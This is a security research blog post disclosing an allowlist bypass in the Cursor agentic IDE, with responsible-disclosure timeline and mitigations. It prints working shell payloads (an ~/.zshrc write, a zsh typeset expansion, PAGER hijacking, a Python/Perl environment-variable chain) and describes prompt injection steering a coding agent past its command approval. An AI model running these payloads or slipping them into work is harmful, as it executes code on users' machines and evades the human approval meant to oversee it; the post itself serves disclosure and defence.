---
layout: post
title: "Cursor Allowlist Bypass (CVE-2026-22708)"
categories: [Security Research]
tags: [ai-security, prompt-injection, sandbox-bypass, cursor, agentic-ide, cve]
image: /assets/img/agent-security-paradox/attack-overview.webp
---

## Executive Summary

I discovered a critical vulnerability in Cursor (CVE-2026-22708) that exploits how agentic IDEs handle shell built-in commands. The flaw enables sandbox bypass and remote code execution even with an empty command allowlist.

The vulnerability allows attackers to manipulate environment variables through implicitly trusted shell built-ins like `export`, `typeset`, and `declare`. This poisoning converts approved commands — such as `git branch` or `python3 script.py` — into arbitrary code execution vectors.

Two attack categories were identified:

- **One-Click Attacks:** Require user approval of seemingly safe commands that trigger malicious code due to poisoned environments
- **Zero-Click Attacks:** Require no user interaction, exploiting shell syntax and parameter expansion features

![Attack overview](/assets/img/agent-security-paradox/attack-overview.webp)

## The Agent Security Paradox

Traditional security models assume human oversight. Agentic IDEs break this assumption by executing commands programmatically without understanding the distinction between instruction and data. They follow instructions from external content while operating with full user privileges.

The core issue: sanitization-based defenses fail in AI coding contexts where code is expected input, creating infinite command injection primitives.

## Cursor's Security Model

Cursor implements two protections:

1. A user-controlled allowlist
2. Server-side command evaluation determining if commands are "executables"

Both were bypassed. Shell built-ins execute without user confirmation, allowing silent environment variable manipulation that influences trusted developer tools.

## Confirmed Attack Vectors

### Zero-Click Attack - Arbitrary File Write

```bash
export && <<<'open -a Calculator'>>~/.zshrc
```

This bypasses detection by using here-strings and redirection without invoking traditional commands.

<video controls muted playsinline style="max-width: 100%; border-radius: 8px;">
  <source src="/assets/img/agent-security-paradox/export-arbitrary-write.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

### Zero-Click Attack - Direct RCE via typeset

```bash
typeset -i ${(e):-'$(open -a Calculator)'}
```

The `(e)` zsh expansion flag evaluates the default value as code when the parameter is empty.

<video controls muted playsinline style="max-width: 100%; border-radius: 8px;">
  <source src="/assets/img/agent-security-paradox/typeset-rce.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

### One-Click Attack - PAGER Hijacking

Setup (executes without consent):

```bash
export PAGER="open -a Calculator"
```

Trigger (appears benign, already allowlisted):

```bash
git branch
```

When git displays output through the `PAGER` environment variable, attacker-controlled code executes instead.

<video controls muted playsinline style="max-width: 100%; border-radius: 8px;">
  <source src="/assets/img/agent-security-paradox/pager-hijack.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

### Python Warning Handler Chain

Multiple environment variables chain together for RCE:

```bash
export PYTHONWARNINGS="all:0:antigravity.x:0:0"
export BROWSER="perlthanks"
export PERL5OPT="-Mbase;system('id');exit"
```

The `antigravity` module triggers web browser handling, which respects the `BROWSER` variable pointing to a Perl script that accepts code via `PERL5OPT`.

<video controls muted playsinline style="max-width: 100%; border-radius: 8px;">
  <source src="/assets/img/agent-security-paradox/python-chain.mp4" type="video/mp4">
  Your browser does not support the video tag.
</video>

## Why This Attack Is Effective

**Invisible Preparation, Visible Approval:** Malicious setup happens silently through trusted built-ins while users see only final commands appearing benign.

**Exploiting Existing Trust:** Common allowlisted commands (git, python, npm) become vectors rather than security controls.

**Reliance on Sanitization:** Allowlists and sanitizers fail against the expansive attack surface of AI coding agents that expect code as input.

## How AI Agents Changed the Threat Model

Previous environment variable poisoning research (Elttam's 2020 blog) required direct machine access and manual execution. AI agents eliminate these barriers by:

- Being manipulable through prompt injection
- Executing commands programmatically
- Chaining operations without human intervention

What required physical access is now remotely exploitable through malicious content agents process.

## Responsible Disclosure Timeline

- **August 11, 2025:** Vulnerability reported to Cursor
- **August 2025:** Cursor acknowledges issue
- **September 2025:** Cursor identifies as "systemic issue" with two major initiatives underway
- **January 2026:** Cursor releases fix

## Mitigation Strategies

1. Treat shell built-ins as security-sensitive operations
2. Sandbox environment variable modifications, not just command execution
3. Implement environment variable isolation between agent sessions
4. Understand allowlists pose inherent security risks

Cursor's own guidance: "The allowlist is best-effort — bypasses are possible. Never use 'Run Everything' mode."

## Conclusion

The vulnerability demonstrates a fundamental truth: features designed for human-controlled environments become attack vectors under autonomous agent execution. This required no zero-days or memory corruption — only recognizing that AI agents operate under different trust assumptions than humans.

As AI assistants embed deeper in development workflows, security must evolve beyond traditional threat models to audit every "safe" feature for behavior under autonomous execution.

---

*This post was originally published on [pillar.security](https://www.pillar.security/blog/the-agent-security-paradox-when-trusted-commands-in-cursor-become-attack-vectors).*
